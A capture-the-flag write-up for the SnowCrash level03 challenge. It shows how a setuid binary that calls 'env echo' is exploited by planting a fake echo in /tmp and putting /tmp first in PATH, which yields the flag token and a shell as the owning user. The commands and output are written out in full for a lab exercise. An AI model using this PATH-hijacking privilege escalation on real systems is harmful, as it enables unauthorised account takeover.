## level03

We’re presented with a binary owned by `flag03`

```bash
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$ ./level03 
Exploit me
```

Let’s see what it does under the hood using `ltrace` (mental pin for future me: try ltrace before starting to reverse engineer with GDB, ref or IDA: stay simple!)

```bash
level03@SnowCrash:~$ ltrace ./level03 
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                 = 2003
geteuid()                                                 = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)       = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)       = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                               = 0
+++ exited (status 0) +++
```

So the program gets the current groupid and uid and then sets them.

There’s an actual stackoverflow discussion on why this code is vulnerable: 

[What is vulnerable about this C code?](https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code)

The problem is that `echo` is called from `env` so if we were to write our own version of `echo` and get the `env` to call that one instead we could exec arbitrary code… and to do so as the file’s owner so `flag03`.

We don’t have write permission in out home so let’s write our own `echo` in `/tmp` and let’s add `/tmp` at the start of `PATH` envariable so that our `echo` is the first one to fire.

```bash
level03@SnowCrash:~$ echo "getflag" > /tmp/echo
level03@SnowCrash:~$ chmod 777 /tmp/echo
level03@SnowCrash:~$ export PATH=/tmp:$PATH
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

To be clear (like in the last example on stackoverflow) if we were to write in `echo` a call to bash we’d get a bash as flag03

```bash
level03@SnowCrash:~$ echo "/bin/bash" > /tmp/echo
level03@SnowCrash:~$ ./level03 
bash: /home/user/level03/.bashrc: Permission denied
flag03@SnowCrash:~$ # <--- see the username
```

### Key Learnings
- Env invocation by a privileged user -> Privilege escalation by providing replacement to built-in command